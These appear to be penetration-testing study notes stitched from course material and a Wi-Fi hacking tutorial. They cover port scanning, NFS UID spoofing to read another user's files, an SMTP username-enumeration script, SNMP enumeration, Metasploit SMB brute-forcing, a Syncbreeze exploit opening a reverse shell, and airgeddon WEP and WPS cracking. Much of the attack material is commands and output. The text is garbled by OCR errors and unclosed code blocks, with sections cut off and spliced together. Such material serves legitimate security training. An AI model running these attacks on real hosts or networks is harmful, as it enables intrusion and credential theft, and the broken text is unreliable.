### Port Scanning

#### NMAP

##### Stealth | SNY Scanning (-sS)

- SYN scanning is a TCP port scanning method that involves sending SYN packets to various ports on a target machine without completing a TCP handshake.

```
# nmap -sS 192.168.0.196  
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 00:42 EST

MAC Address: 00:0C:29:95:9D:B8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.11 seconds
```

##### TCP Connect Scanning (-sT)

- TCP connect scan is the default TCP scan type
- establish a full **connection** (Three way handshake)

```
# nmap -sT 192.168.101.114                                                                                    255 тип

#### Masscan

Masscan is arguably the fastest port scanner; it can scan the entire Internet in about 6 minutes.  transmitting an astounding 10 miIlion packets per second! While it was originally designed to scan the entire Internet, it can easily handle a class A or B subnet, which is a more suitable target range during a penetration test.

Masscan is not installed on Kali by default; it must be installed using apt install:

```
kali@kali:~$ sudo apt install masscan
```

Consider this demonstration that locates all machines on a large internal network with TCP port 80 open (using the -p80 option). Since masscan implements a custom TCP/IP stack, it will require access to raw sockets and therefore requires sudo.

```
kali@kali:~$ sudo masscan -p80 10.0.0.0/8
```

We will add a few additional masscan options, including --rate to specify the desired rate of packet  transmission, -e to specify the raw network interface to use, and --router-ip to specify the IP address for the appropriate gateway:

```
kali@kali:~$ sudo masscan -p80 10.11.1.8/24 --rate=1000 -e tap0 --router-ip 10.11.0.1

#### Nbtscan



### NFS Enumeration

Both Portmapper  and RPCbind run on TCP port 111. RPCbind maps RPC services to the ports on which they listen. RPC processes notify rpcbind when they start, registering the ports they are listening on and the RPC program numbers they expect to serve.

#### Scanning for NFS Shares

We can scan these ports with nmap using the following syntax:

```
kali@kali:~$ nmap -v -p 111 10.11.1.1-254
```

We can use NSE scripts like rpcinfo to fi nd services that may have registered with rpcbind:

```
kal i@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254

Once we find NFS running, we can collect additional information, en umerate NFS services, and discover additional services using NSE scripts found in the /usr/share/nmap/scripts directory:

```
kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.12
...
Nmap scan report for 10,11,1,72
PORT
STATE SERVI CE
111/tcp open rpcbind
| nfs-showmount:
|_  /home 10.11.0.0/255.255.0.
```

In this case, the entire /home directory is being shared and we can access it by mounting it on our Kali virtual machine. We will use mount to do this, along with -o nolock to disable file locking, which is often needed for older NFS servers:

```
kali@kali:-$ mkdir home

kali@kali:~$ sudo mount -o nolock 10.11.1.12:/home -/home/

kali@kali:~$ cd home/ && ls
jenny joe45 john marcus ryuu
```

Based on this file listing, we can see that there are a few home directories for local users on the remote machine. Digging a blt deeper, we find a filename that catches our attention, so we try to view it:

```
kali@kali:-/home$ cd marcus
kali@kali:~/home/marcus$ ls -la
total 24
drwxr-xr-x 2 1014 1014 4096 Jun 10 09: 16 тАв
drwxr-xr-x 7 root root 4096 Sep 17 2015 ..
-rwx------ 1 1814 1814
48 Jun 10 89:16 creds.txt

kali@kali:-/home/marcus$ cat creds.txt
cat: creds.txt: Permission denied
```

It appears we do not have permission to view this file. Taking a closer look at the file permissions, we can see that its owner has a UUID of 1014, and also read (r), write (w), and execute (x) permissions on it. What can we do with this information? Since we have complete access to our Kali machine, we can try to add a local user to it using the adduser command, change its UUID to 1014, su to that user, and then try  ccessing the file again:

```
kali@kali:-/home/stefan$ sudo adduser pwn
Adding user 'pwn' ...
Adding new group 'pwn' (1001) .тАвтАв
Adding new user 'pwn' (1001) with group 'pwn' ...
Creating home directory '/home/pwn'
Copying files from '/etc/skel' ..тАв
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
Changing the user information for pwn
Enter the new value, or press ENTER for the default
Full Name []:
Room Number [] :
Work Phone []:
Home Phone [] :
Other[]:
Is the information correct? [V/n]
```

Based on the output above, we can see that the new user has a UUID of 1001, which is not really what we need. We ca n change it to 1014 using sed and confirm the change took place. The -i option is used to replace the file in-place and the -e option executes a script. In this case, that happens to be 's/1001/1014/g ', which will globally replace the UUID in the /etc/passwd file:

```
kali@kali:-/home/marcus$ sudo sed -i -e 's/1001/1014/g' /etc/passwd

kali@kali:~/home/marcus$ cat /etc/passwd | grep pwn
pwn:x :1014:1014 :,,,:/home/pwn:/bin/bash
```

So far so good. Let's try to su to the newly added pwn user, verify that our UUID has indeed changed, and then try accessing that file again. We will use the su command to change the current login session's owner. Then, we will use id to display our current user ID. Finally, we wi ll try to access the file again:

```
kali@ka1i:~/home/marcus$ su pwn

pwn@ka1i:/root/home/marcus$ id
uid=1014(pwn) gid=1014 groups=1014

pwn@ka1i:/root/home/marcus$ cat creds.txt
Not what you are looking for, try harder!!! :0)
```



### SMTP Enumeration

We can also gather information about a host or network from vulnerable mail servers. The Simple Mail Transport Protocol (SMTP)  supports several interesting commands, such as VRFY and EXPN. A VRFY request asks the server to verify an email address, w hile EXPN asks the server for the membership of a mailing list. These can often be abused to verify existing users on a mail server, w hich is useful informatfon during a penetration test. Consider this example:

```
kali@ka1i:~$ nc -nv 10.11.1.211 25
(UNKNOWN) (10.11.1.217] 25 (smtp) open
220 hot1ine.localdomain ESMTP Postfix
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient add ress rejected: User unknown in local recipient table
^C
```

Notice how the success and error messages differ. The SMTP server happily verifies that the user exists. Thf s procedure can be used to help guess valid usernames in an automated fashion. Consider the following Python script that opens a TCP socket, connects to the SMTP server, and issues a VRFY command for a given username:

```
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 2:
	print "Usage: vrfy.py <username>"
	sys.exit(0)
	
# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
connect= s.connect(('10.11.1.217',25))

# Receive the banner
banner= s.recv(1024)

print banner

# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result= s.recv(1024)

print result

# Close the socket
s.close()
```



### SNMP Enumeration

#### NMAP

To scan for open SNMP ports, we can run nmap as shown in the example that follows. The -sU option is used to perform UDP scanning and t he --open option is used to limit the output to only display open ports:

```
kali@kali:~$ sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
Starting Nmap 7.70 ( https://nmap.org) at 2019-05-01 06:26 MDT

PORT    STATE  SERVICE
161/udp openl  filtered snmp
MAC Address: 00:50:56:93:4E:DC (VMware)
...
```

#### onesixtyone

Alternatively, we can use a tool such as onesixtyone, which will attempt a brute force attack against a list of IP add resses. First we must build text files containing community strings and the IP addresses we wish to scan:

```
kali@kali:~$ echo public > community
kali @kali: ~$ echo private>> community
kali @kali:-$ echo manager >> community

kali@kali:~$ for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips

kali@kali:~$ onesixtyone -c community -i ips

#### snmpwalk

##### Windows SNMP Enumeration Example

We can probe and query SNMP values using a tool such as snmpwalk provided we at least know
the SNMP read-only community string, which in most cases is "public".

###### Enumerating the Entire MIB Tree

Using some of the MIB values provided in Listing , we can attempt to enumerate their corresponding values. Try out the following examples against a known machine in the labs, which has a Windows SNMP port exposed wit h the community string "public". This command enumerates the entire MIB tree using the -c option to specify the community string, and -v to specify the SNMP version number as well as the -t 10 to increase the timeout period to 10 seconds:

```
kali@kali:~$ snmpwalk -c public -v1 -t 10  10.11.1.14
iso.3.6.1.2.1.1.1.0 = STRI NG: "Hardwa re: x86 Family 6 Model 12 Stepping 2 AT/AT COMPAT
IBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3,1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (2005539644) 232. days, 2:56:36.44
iso.3.6.1.2.1.1.4.0 = 1111
...
```

###### Enumerating Windows Users

This example enumerates the Windows users:

```
kali@kali:~$ snmpwalk -c public -vl 10.11.1.14 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.3.98.111.98 = STRING: "bob"

iso.3.6.1.4.1.77.1.2.25.1.1.8.73.85.83.82.95.66.79.66 = STRING: " IUSR_BOB"
```

###### Enumerating Running Windows Processes

This example enumerates the running Windows processes:

```
kali@kali:~$ snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Pr-ocess "

iso.3.6.1.2.1.25.4.2.1.2.480 = STRING: "lsass.exe"
iso.3.6.1.2.1.25.4.2.1.2.488 = STRING: "lsm.exe"
...
```

###### Enumerating Open TCP Ports

This example enumerates the open TCP ports:

```
kali @kali:~$ snmpwatk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3

iso.3.6.1.2.l.6.13.l.3.0.0.0.0.443.0.0.0.0.45070 = INTEGER: 443
...
```

###### Enumerating Installed Software

This example enumerates installed software:

```
kali@kali:~$ snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "LiveUpdate 3.3 (Symantec Corporation)"
iso.3.6.1.2.1.25.6.3.1.2.2 = STRING: "WampServer 2.5"

#### Nikto

- Nikto is a highly configurable Open Source web server scanner that tests for thousands of dangerous files and programs, vulnerable server versions and various server configuration issues. It performs well, but is not designed for stealth as it will send many requests and embed information about itself in the User-Agent header.

We'll specify the host we want to scan (-host=http://www.megacorpone.com) and for the sake of this demonstration, we'll use -maxtime=30s to limit t he scan duration to 30 seconds:

```

### Cross-Site Scripting (XSS)

### Identifying XSS Vulnerabilities



## The Metasploit Framework

### Metasploit User Interfaces and Setup

Start postgresql service

```
kali@kali:~$ sudo systemctl start postgresql
```

Enable postgresql at boot time

```
kali@kali:~$ sudo systemctl enable postgresql
```

Update metasploit

```
kali@kali:~$ sudo apt update; sudo apt install metasploit-framework
```

Launch metasploit

```
kali@kali:~$ sudo msfconsole
```

The Metasploit Framework includes several thousand modules, divided into categories. The
categories are displayed on the splash screen summary but we can also view them with the show
-h command.

```
msf6 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
```

To activate a module, enter use followed by the module name (auxiliary/scanner/portscan/tcp in
the example below). At this point, the prompt will indicate the active module. We can use back to
move out of the current context and return to the main msf6 prompt:

```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > back
msf6 >
```

A variation of back is previous , which will switch us back to the previously selected module
instead of the main prompt:

```
msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/syn
msf5 auxiliary(scanner/portscan/syn) > previous
msf5 auxiliary(scanner/portscan/tcp) >
```

Most modules require options ( show options ) before they can be run. We can configure these
options with set and unset and can also set and remove global options with setg or unsetg
respectively.

```
msf6 auxiliary(scanner/portscan/tcp) > show options 

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

```

For example, to perform a scan of our Windows workstation with the scanner/portscan/tcp
module, we must first set the remote host IP address ( RHOSTS ) with the set command.

```
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.101.113
RHOSTS => 192.168.101.113
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.101.113:      - 192.168.101.113:80 - TCP OPEN
[+] 192.168.101.113:      - 192.168.101.113:135 - TCP OPEN
[+] 192.168.101.113:      - 192.168.101.113:139 - TCP OPEN
[+] 192.168.101.113:      - 192.168.101.113:445 - TCP OPEN
[+] 192.168.101.113:      - 192.168.101.113:443 - TCP OPEN

```

### Metasploit Database Access

- If the postgresql service is running, Metasploit will log findings and information about discovered
  hosts, services, or credentials in a convenient, accessible database.
- In the following listing, the database has been populated with the results of the TCP scan we ran in
  the previous section. We can display these results with the services command:

```
msf6 auxiliary(scanner/portscan/tcp) > services

The basic services command displays all results, but we can also filter by port number ( -p ),
service name ( -s ), and more as shown in the help output of services -h :

```
msf6 auxiliary(scanner/portscan/tcp) > services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at
```

In addition to a simple TCP port scanner, we can also use the db_nmap wrapper to execute Nmap
inside Metasploit and save the findings to the database for ease of access. The db_nmap command
has identical syntax to Nmap and is shown below:

```

To display all discovered hosts up to this point, we can issue the hosts command. As an additional
example, we can also list all services running on port 445 with the services -p 445 command.

```
msf6 > hosts

```

To help organize content in the database, Metasploit allows us to store information in separate
workspaces. When specifying a workspace, we will only see database entries relevant to that
workspace, which helps us easily manage data from various enumeration efforts and assignments.
We can list the available workspaces with workspace , or provide the name of the workspace as an
argument to change to a different workspace

```
msf6 > workspace --help
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r <old> <new>   Rename workspace
    workspace -h               Show this help information
```


### Auxiliary Modules

The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such
as protocol enumeration, port scanning, fuzzing, sniffing, and more. The modules all follow a
common slash-delimited hierarchical syntax (module type/os, vendor, app, or protocol/module
name), which makes it easy to explore and use the modules. Auxiliary modules are useful for many
tasks, including information gathering (under the gather/ hierarchy), scanning and enumeration of
various services (under the scanner/ hierarchy), and so on.

To list all auxiliary modules, we run the show auxiliary command. This will present a very long
list of all auxiliary modules as shown in the truncated output below:

```
msf5 > show auxiliary
Auxiliary

Name
Rank
Description
----
----
-----------
................
scanner/smb/smb1

normal SMB SID User Enumeration (LookupSid)

normal MS17-010 SMB RCE Detection
scanner/smb/smb_version
normal SMB Version Detection
```

We can use search to reduce this considerable output, filtering by app, type, platform, and more.
For example, we can search for SMB auxiliary modules with search type:auxiliary name:smb
as shown in the following listing.

```
msf6 > search -h
Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
  -h                Show this help information
  -o <file>         Send output to a file in csv format
  -S <string>       Regex pattern used to filter search results
  -u                Use module if there is one result

#### SMB Scanner

After invoking a module with use , we can request more info about it as follows:

```
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > info

       Name: SMB Version Detection
     Module: auxiliary/scanner/smb/smb_version
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>
  Spencer McIntyre
  Christophe De La Fuente

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  THREADS  1                yes       The number of concurrent threads (max one per host)

Description:
  Fingerprint and display version information about SMB servers. 
  Protocol information and host operating system (if available) will 
  be reported. Host operating system detection requires the remote 
  server to support version 1 of the SMB protocol. Compression and 
  encryption capability negotiation is only present in version 3.1.1.
```

Alternatively, since we have already scanned our Windows 10 machine, we could search the Metasploit database for hosts with TCP port 445 open ( services -p 445 ) and automatically add the results to RHOSTS ( тАУrhosts ):

```
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
Services
========

host             port  proto  name          state  info
----             ----  -----  ----          -----  ----
192.168.101.113  445   tcp    microsoft-ds  open   Windows 10 Pro 18363 microsoft-ds workgroup: WORKGROUP

RHOSTS => 192.168.101.113
```

With the required parameters configured, we can launch the module with run or exploit :

```
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.101.113:445   - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{35057c78-9f1c-448f-9746-fcd47bdc8546}) (authentication domain:DESKTOP-H5AKSBG)
[+] 192.168.101.113:445   -   Host is running Windows 10 Pro (build:18363) (name:DESKTOP-H5AKSBG) (workgroup:WORKGROUP)
[*] 192.168.101.113:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Based on the moduleтАЩs output, the remote computer does indeed support SMB version 2. To leverage this, we can use the scanner/smb/smb_login module to attempt a brute force login against the machine. Loading the module and listing the options produces the following output:

```
msf6 > use auxiliary/scanner/smb/smb_login  

msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   VERBOSE            true             yes       Whether to print output for all attempts

```

We notice that RHOSTS is not set, even though we set it while using the previous smb2 module. This is because set defines a parameter only within the scope of the running module. We can instead set a global parameter, which is available across all modules, with setg .

```
msf6 auxiliary(scanner/smb/smb_login) > setg RHOSTS 192.168.101.113
RHOSTS => 192.168.101.113
```

WeтАЩll start by supplying the valid domain name of corp.com , a valid username ( Offsec ), an invalid password ( ABCDEFG123! ), and the Windows 10 targetтАЩs IP address:

```
msf5 auxiliary(scanner/smb/smb_login) > set SMBDomain corp.com
SMBDomain => corp.com
msf5 auxiliary(scanner/smb/smb_login) > set SMBUser Offsec
SMBUser => Offsec
msf5 auxiliary(scanner/smb/smb_login) > set SMBPass ABCDEFG123!
SMBPass => ABCDEFG123!
msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.11.0.22
RHOSTS => 10.11.0.22
msf5 auxiliary(scanner/smb/smb_login) > set THREADS 10
THREADS => 10
msf5 auxiliary(scanner/smb/smb_login) > run
[*] 10.11.0.22:445 - 10.11.0.22:445 - Starting SMB login bruteforce
[*] 10.11.0.22:445 - 10.11.0.22:445 - This system does not accept authentication wit
[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: 'corp.com\Offsec:ABCDEFG123!',
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Since we knew that the password we supplied was invalid, the login failed as expected. Now, letтАЩs try to supply a valid password and re-run the module.

```
msf5 auxiliary(scanner/smb/smb_login) > set SMBPass Qwerty09!

Although this run was successful, this method will not scale well. To test a larger user base with a variety of passwords, we could instead use the USERPASS_FILE parameter, which instructs the module to use a file containing users and passwords separated by space, with one pair per line.

#### RDP Scanner

LetтАЩs try out another module. In this example, we will try to identify machines listening on TCP port
3389, which indicates they might be accepting Remote Desktop Protocol (RDP) connections. To do
this, we will invoke the scanner/rdp/rdp_scanner module.

We can specify a standard reverse shell payload (windows/shell_reverse_tcp) with set payload and list the options with show options :

Exploit target:

   Id  Name
   --  ----

```

LetтАЩs go ahead and set LHOST and RHOST to define our attacking host and target host respectively.

```
msf5 exploit(windows/http/syncbreeze_bof) > set LHOST 10.11.0.4
LHOST => 10.11.0.4
msf5 exploit(windows/http/syncbreeze_bof) > set RHOST 10.11.0.22
RHOST => 10.11.0.22
```

After setting LHOST to our Kali IP address and RHOST to the Windows host IP address, we can use check to verify whether or not the target host and application are vulnerable. Note that this check will only work if the target application exposes some sort of banner or other identifiable data.

```
msf5 exploit(windows/http/syncbreeze_bof) > check
[*] 10.11.0.22:80 - The target appears to be vulnerable.
```

With confirmation that the target is vulnerable, all that remains now is to run the exploit using the
exploit command as displayed below.

```
msf5 exploit(windows/http/syncbreeze_bof) > exploit

[*] Started reverse TCP handler on 10.11.0.4:4444
[*] Automatically detecting target...

Notice that when we execute the exploit, Metasploit automatically creates a payload listener,
eliminating the need for Netcat. Upon execution completion, a session is created and the reverse
shell is made available for us.

#### Metasploit Payloads

##### Staged vs Non-Staged Payloads

Before jumping into specific shellcode functionality, we must discuss the distinction between
staged and non-staged shellcode, as evidenced by the description of these two payloads:

```
windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
```

**non-staged payload**

- is sent in its entirety along with the exploit

**staged payload**

- is usually sent in two parts.
- the first part contains a small primary payload that causes the victim machine to connect back to the
  attacker
- transfer a larger secondary payload containing the rest of the shellcode, and then execute
  it.

There are several situations in which we would prefer to use staged shellcode instead of non- staged. If the vulnerability we are exploiting does not have enough buffer space to hold a full payload, a staged payload might be suitable. Since the first part of a staged payload is typically smaller than a full payload, these smaller initial payloads can likely help us in space-constrained situations. In addition, we need to keep in mind that antivirus software will quite often detect embedded shellcode in an exploit. By replacing that code with a staged payload, we remove a good chunk of the malicious part of the shellcode, which may increase our chances of success. After the initial stage is executed by the exploit, the remaining payload is retrieved and injected directly into the victim machineтАЩs memory.

**Note that in Metasploit, the тАЬ/тАЭ character is used to denote whether a payload is staged or not, so** 
**тАЬshell_reverse_tcpтАЭ is not staged, whereas тАЬshell/reverse_tcpтАЭ is.**

##### Meterpreter Payloads

Meterpreter

- is a multi-function payload that can be dynamically extended at run-time.

- provides more features and functionality than a regular command shell, offering capabilities such as file transfer, keylogging, and various other methods of interacting with the victim machine.
- These tools are especially useful in the post-exploitation phase. Because of MeterpreterтАЩs flexibility and capability, it is the favorite and most commonly-used Metasploit payload.

A search for the тАЬmeterpreterтАЭ keyword returns a long list of results, but narrowing the search to the payload category reveals meterpreter versions for multiple operating systems and architectures including Windows, Linux, Android, Apple iOS, FreeBSD, and Apple OS X/macOS.

There are a multitude of Meterpreter versions based on specific programming languages (Python, PHP, Java), protocols and transports (UDP, HTTPS, IPv6, etc), and other various specifications (32-bit vs 64-bit, staged vs unstaged, etc). 

For example, a small selection of Windows reverse meterpreter payloads is shown below:

```
 59  payload/windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)

   61  payload/windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   62  payload/windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager

```

We can select a specific meterpreter payload with set and configure it just as we would a standard reverse shell payload:

```

LetтАЩs try this payload against Syncbreeze. With everything configured correctly, we can launch the
exploit and establish a reverse meterpreter connection:

```
msf5 exploit(windows/http/syncbreeze_bof) > exploit

### Method 3: Evil Twin

#### Airgeddon

Indeed, it is not necessary, but I prefer to unload Network Manager and stop all other processes which would interfere in my activity:

```
$ sudo systemctl stop NetworkManager
$ sudo airmon-ng check kill
```

тАЛ	Launch the script:

```
$ sudo bash airgeddon.sh
```

тАЛ	[![img](images/1-1613554201581.png)

тАЛ	Select the correct (wireless) interface, named **wlan0**:

тАЛ	[![img](images/2-1613554205939.png)

тАЛ	Now select the second option from menu - Put interface in monitor mode:

тАЛ	[![img](images/3-1613554208486.png)

тАЛ	Now we are armed completely. We are able to hack our first Wi-Fi network.

тАЛ	[![img](images/28-1-1613554210694.png)

#### Automated WEP attack 

As I mentioned above, there are some different protocols and cyphers  using by Wi-Fi networks. The weakest one is WEP. The WEP protocol had a  bad design and can be cracked in a few minutes if we have enough  generated traffic. So we should start from checking whether any WEP  enabled networks is available around us.

тАЛ	Select  9  WEP attacks menu

тАЛ	[![img](images/4-1613554213081.png)]

Select the 4. Explore for targets (monitor mode needed)тАЩ menu item to find any WEP enabled Wi-Fi networks:

![img](images/5-1613554227685.png)

тАЛ	When started, press [Ctrl+C] to stopтАж

тАЛ	[![img](images/6-1613554230350.png)

тАЛ	As you can noticed, I can reach the only one WEP enabled network:

```
4)  00:1E:58:C6:AC:FB  6  57%  WEP  dlink
```

тАЛ	Therefore, I enter 4:

тАЛ	![img](images/7-1613554235158.png)

тАЛ	Currently I am completely ready to start the attack, I should select the тАШ5. WEP "All-in-One" attackтАЩ menu item:

тАЛ	![img](images/8-1613554237536.png)

The WEP "All-in-One" attack combines different techniques to generate  enough traffic to decrypt the key (Caffe Latte, Hirte, Replay,  Chop-Chop, Fragmentation, Fake association, etc.

тАЛ	The program reports:

```
You have a valid WEP target network selected. Script can continue...``Press [Enter] key to continue...
```

тАЛ	And asks the path for the file to save the cracked password, I press [Enter] to accept the default proposal:

```
If the password for the wifi network is obtained with the "All-in-One" WEP attack, you should decide where to save it. Type the path to store the file or press [Enter] to accept the default proposal [/root/wep_captured_key-dlink.txt]
```

![img](images/9-1613554239854.png)

тАЛ	Next:

```
The path is valid and you have write permissions. Script can continue...``Press [Enter] key to continue...` `All parameters and requirements are set. The attack is going to start. Multiple windows will be opened, don't close anyone. When you want to stop the attack press [Enter] on this window and the script will automatically close them all``Press [Enter] key to continue...
```

![img](images/10-1613554242999.png)

тАЛ	WEP attack in progress:

![img](images/11-1613554194409.png)

тАЛ	The WEP password as ASCII string and in Hexadecimal will be shown in the new window:

тАЛ	![img](images/12-1613554186477.png)

тАЛ	In my test they are:

```
ASCII: ey20001010
Hexadecimal: 4A656E6E793230303031303130
```

Also you can get them from the **/root/wep_captured_key-dlink.txt** file:

```
$ cat /root/wep_captured_key-dlink.txt
```

But in my test the ASCII string does not equal Hexadecimal. To prove that I type the command:

```
$ echo 4A656E6E793230303031303130 | xxd -r -p
Jenny20001010
```

тАЛ	![img](images/13-1613554178988.png)

You can convert Hexadecimal value to ASCII string by the following command, where replace **Hex_Value** with actual Hexadecimal:

```
$ echo [Hex_Value] | xxd -r -p
```

#### Automated WPS attack 

Many WPS enabled Wi-Fi Access Points is vulnerable to WPS attacks.

Currently there are known issues with the devices that uses rt2800usb  drivers (chips RT3070, RT3272, RT3570, RT3572 etc). There is  unfortunately right now no solution. Therefore, the great [Alfa AWUS052NH](http://rover.ebay.com/rover/1/711-53200-19255-0/1?icep_ff3=9&pub=5575132165&toolid=10001&campid=5338168946&customid=&icep_uq=Alfa+AWUS052NH&icep_sellerId=&icep_ex_kw=&icep_sortBy=12&icep_catId=&icep_minPrice=&icep_maxPrice=&ipn=psmain&icep_vectorid=229466&kwid=902099&mtid=824&kw=lg)![img](https://rover.ebay.com/roverimp/1/711-53200-19255-0/1?ff3=9&pub=5575132165&toolid=10001&campid=5338168946&customid=&uq=Alfa+AWUS052NH&mpt=[CACHEBUSTER]) and [Panda Wireless PAU09 N600](http://rover.ebay.com/rover/1/711-53200-19255-0/1?icep_ff3=9&pub=5575132165&toolid=10001&campid=5338168946&customid=&icep_uq=Panda+Wireless+PAU09+N600&icep_sellerId=&icep_ex_kw=&icep_sortBy=12&icep_catId=&icep_minPrice=&icep_maxPrice=&ipn=psmain&icep_vectorid=229466&kwid=902099&mtid=824&kw=lg)![img](https://rover.ebay.com/roverimp/1/711-53200-19255-0/1?ff3=9&pub=5575132165&toolid=10001&campid=5338168946&customid=&uq=Panda+Wireless+PAU09+N600&mpt=[CACHEBUSTER]) do not suit for these attacks.

For all WPS attacks, I highly recommend to use [Alfa AWUS036NHA](http://rover.ebay.com/rover/1/711-53200-19255-0/1?icep_ff3=9&pub=5575132165&toolid=10001&campid=5338168946&customid=&icep_uq=Alfa+AWUS036NHA&icep_sellerId=&icep_ex_kw=&icep_sortBy=12&icep_catId=&icep_minPrice=&icep_maxPrice=&ipn=psmain&icep_vectorid=229466&kwid=902099&mtid=824&kw=lg)![img](https://rover.ebay.com/roverimp/1/711-53200-19255-0/1?ff3=9&pub=5575132165&toolid=10001&campid=5338168946&customid=&uq=Alfa+AWUS036NHA&mpt=[CACHEBUSTER]). Because it is based on another chipset and uses another driver.

In the main menu select the тАШ8. WPS attacks menuтАЩ item:

**There are 4 WPS attacks in airgeddon:**

- **Custom PIN association** 
- **Pixie Dust attack** 
- **Bruteforce PIN attack** 
- **Known PINs database based attack** 

##### Pixie Dust attack 

WPS PIN exploiting the low or non-existing entropy of some Access  Points, the so-called "pixie-dust attack" discovered by Dominique  Bongard in summer 2014.

As opposed to the traditional online brute-force attack, implemented in tools like [Reaver](https://en.kali.tools/?p=346) or Bully which aim to recover the pin in a few hours, this method can  get the PIN in only a matter of milliseconds to minutes, depending on  the target, if vulnerable.

As any other attacks, start from тАШ4. Explore for targets (monitor mode needed)тАЩ:

тАЛ	![img](images/15-1613554261828.png)

тАЛ	Select not Locked (marked red) AP:

тАЛ	![img](images/16-1613554264193.png)

Next select тАШ8. (reaver) Pixie Dust attackтАЩ. Select Pixie Dust timeout 100 or more seconds.

Starting attack. When started, press [Ctrl+C] to stopтАж

After stopping the attack (using [Ctrl+C]), the window will not be  closed automatically. So you'll have time to write down the password if  successful. You'll have to close it manually

тАЛ	![img](images/17-1613554267414.png)

##### Known PINs database based attack 

The attack described in details in тАШ[Effective WPS PINs attack based on known PIN and PIN generation algorithms](https://miloserdov.org/?p=325)тАЩ.

##### Bruteforce PIN attack 

This attack requires hours or days to get WPS PIN. Use the attack if previous ones failed.

##### Custom PIN association 

This attack lets you reveal WPA-PSK password of Wi-Fi network if you know WPS PIN.

тАЛ	![img](images/18-1613554270270.png)



#### WPA/WPA2 attack 

If target Access Point is not WPS enabled or if all WPS attacked  failed, we can try to capture Handshake (frames by which the Access  Point and Station are exchanged during connection) and decrypt it.

